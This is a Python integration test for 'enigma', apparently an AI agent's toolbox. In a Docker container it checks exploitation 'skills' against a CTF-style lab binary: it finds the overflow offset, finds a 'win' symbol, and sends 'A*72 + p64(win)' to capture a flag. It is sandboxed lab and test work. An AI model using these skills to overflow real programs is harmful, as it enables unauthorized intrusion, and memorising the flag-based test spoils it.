#!/usr/bin/env python3
"""Live integration check: skills against a real enigma-homework container.

Requires docker + the enigma-homework:latest image (homework/build.sh).
Plain asserts; run directly: pipenv run python homework/test_skills_live.py
"""
import asyncio
import dataclasses
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)
sys.path.insert(0, REPO)
sys.path.insert(0, HERE)

from run_hw import _load_enigma_env  # noqa: E402

NAME = "enigma-hw-skilltest"


def sh(*args, **kw):
    return subprocess.run(list(args), capture_output=True, **kw)


async def main():
    _load_enigma_env()
    import httpx
    from enigma.config import load_config
    from enigma.tools import ToolBox

    expected = json.load(open(os.path.join(HERE, "flags.json")))["rung1"]

    sh("docker", "rm", "-f", NAME)
    r = sh("docker", "run", "-d", "--name", NAME,
           "enigma-homework:latest", "sleep", "infinity")
    assert r.returncode == 0, r.stderr.decode()
    cid = r.stdout.decode().strip()
    try:
        r = sh("docker", "cp", os.path.join(HERE, "flags", "rung1.txt"),
               "%s:/flag.txt" % NAME)
        assert r.returncode == 0, r.stderr.decode()

        cfg = load_config()
        async with httpx.AsyncClient() as http:
            tb = ToolBox(cfg, http)
            tb.bind_container(cid, workdir="/workspace")

            out = await tb.run("skill", "discover_offset /target/rung1")
            assert "offset to saved return address: 72" in out, out

            out = await tb.run("skill", "find_symbol /target/rung1 win")
            assert "0x" in out and "absolute" in out, out
            win = out.split("win = ")[1].split(" ")[0]

            out = await tb.run("skill", "deliver_stdin /target/rung1 A*72 + p64(%s)" % win)
            assert expected in out, out

            # docs advertise the skills
            docs = tb.docs()
            assert "discover_offset" in docs and "deliver_stdin" in docs, docs
    finally:
        sh("docker", "rm", "-f", NAME)
    print("test_skills_live OK")


if __name__ == "__main__":
    asyncio.run(main())
